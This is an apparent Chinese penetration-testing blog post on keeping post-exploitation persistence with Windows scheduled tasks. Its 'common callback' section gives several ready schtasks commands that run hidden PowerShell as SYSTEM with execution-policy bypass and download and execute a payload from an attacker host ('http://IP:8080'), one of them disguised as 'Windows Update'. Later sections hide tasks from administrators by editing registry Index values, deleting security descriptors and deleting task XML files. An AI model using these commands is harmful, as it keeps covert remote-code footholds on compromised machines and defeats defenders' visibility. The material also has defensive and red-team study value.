---
title: "后渗透 权限维持 Schtasks"
date: 2023-09-13T16:32:30+08:00
draft: false
url: /posts/2023-09-13/Schtasks
tags: ["后渗透","权限维持","Schtasks","Windows"]
---

## 0x00 前言

后渗透 权限维持 计划任务

[schtasks create | Microsoft Learn](https://learn.microsoft.com/zh-cn/windows-server/administration/windows-commands/schtasks-create)

## 0x01 Schtasks

### 创建计划任务

```cmd
schtasks /create 
```

### 删除计划任务

```cmd
schtasks /delete
```

### 运行计划任务

```cmd
schtasks /run 
```

### 查询计划任务

```cmd
schtasks /query 
```

### 更改计划任务

```cmd
schtasks /change 
schtasks /end 
```

## 0x02 利用方法

### 创建定时计划任务

+ `<Task Name>`：计划任务的名称。

+ `<command>`：要执行的命令或脚本的路径。

+ `<starttime>`：指定运行任务的开始时间。时间格式为 HH:mm (24 小时时间)，例如 14:30 表示2:30 PM。如果未指定 /ST，则默认值为当前时间。/SC ONCE 必需有此选项。

  > - `/sc daily`：每天执行一次任务
  > - `/sc weekly`：每周执行一次任务
  > - `/sc monthly`：每月执行一次任务

+ `<startdate>`：计划任务的开始日期。可以使用当前日期，例如YYYY/MM/DD

~~~cmd
schtasks /create /tn <Task Name> /tr <command> /sc once /st <starttime> /sd <startdate>

# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc once /st %TIME%

schtasks /create /tn "MyTask" /tr "C:\Users\Public\Downloads\beacon.exe" /sc once /st 18:01 /sd 2023/08/21
~~~

### 在系统空闲时运行计划任务

“空闲时”计划类型计划任务在 /i 参数指定的时间内，没有用户活动时运行。 在“空闲时”计划类型中，需要用到 /sc onidle 参数和 /i 参数。 /sd（开始日期）为可

选，默认值为当前日期

使用必需的 `/i` 参数指定计算机必须在任务开始前的 10 分钟处于空闲状态

```cmd
# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onidle /i <time> 

schtasks /create /tn MyApp /tr "c:\apps\myapp.exe" /sc onidle /i 10 
```

### 计划运行多个程序的任务

每个任务仅运行一个程序。 但是，可以创建运行多个程序的批处理文件，然后计划运行批处理文件的任务

1. 使用文本编辑器创建一个批处理文件，其中包含所需的 .exe 文件的名称和完全限定路径

```cmd
# Usages
# <Terminal Name> 不能相同
cmd /c start /b "<Terminal Name>" "<path to executable>" && cmd /c start /b "<Terminal Name>" "<path to executable>"

cmd /c start /b "AppOne" "One.exe" && cmd /c start /b "AppTwo" "Two.exe"
```

2. 将文件另存为 MyApps.bat，打开 schtasks.exe，然后通过键入以下内容创建运行 MyApps.bat  的任务

```cmd
# Usages
schtasks /create /tn <Task Name> /tr "<path to executable>" /sc onlogon

schtasks /create /tn MyApps /tr "C:\MyApps.bat" /sc onlogon
```

### 查询计划任务

- `/tn <Task Name>`：仅显示指定名称的计划任务
- `/fo <format>`：以指定格式输出结果。例如，`/fo table`以表格形式输出结果，`/fo list`以列表形式输出结果
- `/v`：显示详细信息，包括触发器、操作和状态等

~~~cmd
# 查询全部计划任务
schtasks /query

# Usages:
schtasks /query /tn <Task Name> /v

# 使用/fo list参数以列表形式输出计划任务信息
schtasks /query /fo list

# 获取特定计划任务的详细信息，可以使用/tn <Task Name>参数来指定任务名称
schtasks /query /fo list /tn <Task Name>
~~~

### 常用上线命令

```cmd
#(X64) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onstart /ru System
 
#(X64) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onidle /i 30
 
#(X86) - On User Login
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onlogon /ru System
  
#(X86) - On System Start
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onstart /ru System

#(X86) - On User Idle (30mins)
schtasks /create /tn PentestLab /tr "c:\windows\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /sc onidle /i 30
```

### 到期启动并删除

有效负载的执行也可以在特定时间发生，并且可以具有到期日期和自删除功能

```cmd
# Usage
# /RU %USERNAME%：可选项
schtasks /CREATE /TN <Task Name> /TR "cmd.exe /c start /b <path to executable>" /SC minute /MO 1 /ED <Start Time:yyyy/mm/dd> /ET <End Time:hh:mm> /Z /IT /RU %USERNAME%

schtasks /CREATE /TN "A" /TR "cmd.exe /c start /b <path to executable>" /SC minute /MO 1 /ED 2023/08/29 /ET 17:27 /Z /IT

schtasks /CREATE /TN "Windows Update" /TR "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring(''http://IP:8080/ZPWLywg'''))'" /SC minute /MO 1 /ED 04/11/2019 /ET 06:53 /Z /IT
```

### 日志触发计划任务

如果为目标事件启用了事件日志记录，则可以在特定 Windows 事件上触发任务

```cmd
# 登录日志ID：4624
wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4624)]]

# 注销日志ID：4634
wevtutil qe Security /f:text /c:1 /q:"Event[System[(EventID=4634)]]

# Usage
schtasks /Create /TN <Task Name> /TR "cmd.exe /c start /b <path to executable>" /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"

schtasks /Create /TN OnLogOff /TR "cmd.exe /c start /b <path to executable>" /SC ONEVENT /EC Security /MO "*[System[(Level=4 or Level=0) and (EventID=4634)]]"

schtasks /Query /tn OnLogOff /fo List /v
```

## 0x03 XML 文件

计划任务一旦创建成功，将会自动在 `%SystemRoot%\System32\Tasks` 目录生成一个关于该任务的描述性 XML 文件，包含了所有的任务信息

## 0x04 注册表

在 Windows 7，计划任务注册表路径为

```powershell
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\
```

在 Windows 10，计划任务注册表路径为

```powershell
计算机\HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\
```

**Id**：{GUID}，任务对应的guid编号

**Index**：一般任务值为3，其他值未知

**SD**：Security Descriptor 安全描述符，在Windows中，每一个安全对象实体都拥有一个安全描述符，安全描述符包含了被保护对象相关联的安全信息的数据结构，它的作用主要是为了给操作系统提供判断来访对象的权限

**Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值**

## 0x05 隐藏姿势

### 非完全隐藏

非完全隐藏一个计划任务，通过修改 `\Schedule\TaskCache\Tree` 下对应任务的 Index 值，一般情况下值为 3 。

#### Index 修改

- 修改 `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}` 下对应任务的 Index 值为 0

+ Windows 10 为例，新建计划任务 `cmd` 的高级安全设置中所有者为 SYSTEM，默认无法更改注册表键值

+ 更改所有者为 Administrators，并赋予完全控制权限，才能修改注册表键值
+ 当 Index 修改为 0 后， 利用 `taskschd.msc`、`schtasks.exe` 、甚至系统API查询出的所有任务中，都查看不到所创建的任务。但如果知道该任务名称，可以通过 `schtasks /query /tn {TaskName Path}` 查到
+ 但在 Windows Server 2008 与 Windows 7 中，修改 Index 键值为 0 ，任务计划程序中仍存在该任务，原因未知

#### XML 文件删除

- 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件

```cmd
del /f /s /q %SystemRoot%\System32\Tasks\<Filename>
```

1. 在 Windows 10 中，删除 XML 文件，并不影响计划任务的运行，且在 `taskschd.msc` 任务计划程序中，依然存在对应任务
2. 在 Windows 7 与 Windows Server 2008 中，若删除 XML 文件，任务计划程序中的对应任务也会被删除，并且影响计划任务的运行，但注册表中项值依然存在

### 完全隐藏

#### SD 删除

- 删除 `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD`
- 删除 `%SystemRoot%\System32\Tasks` 下任务对应的 XML 文件

```cmd
reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\{TaskName}\SD" /f

del /f /s /q %SystemRoot%\System32\Tasks\<Filename>
```

这样操作，无论何种方式 (排除注册表) 都查不到该任务，较为彻底。因为 SD 就是安全描述符，它的作用主要是为了给操作系统提供判断来访对象的权限，但被删除后，无法判断用户是否有权限查看该任务信息，导致系统直接判断无权限查看。因此在使用 `schtasks /query /tn \Microsoft\Windows\AppID\<Task Name>` 查询时，提示“错误: 系统找不到指定的文件”

**Windows 7 、Windows Server 2008 无 SD 值、Windows 10 有 SD 值**

